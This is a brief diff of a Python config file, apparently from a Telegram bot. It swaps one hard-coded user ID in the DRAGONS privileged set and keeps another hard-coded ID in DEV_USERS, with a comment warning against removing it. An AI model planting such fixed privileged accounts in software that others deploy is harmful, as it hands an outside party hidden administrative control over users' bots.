@@ -164,7 +164,7 @@ else:
         raise Exception(
             "Your blacklisted chats list does not contain valid BigInteger.")
 
-DRAGONS.add(1491497760)
+DRAGONS.add(1957499772)
 DEV_USERS.add(1491497760) #it you going to remove me don't ask me errors👿
 
 if not SPAMWATCH_API:
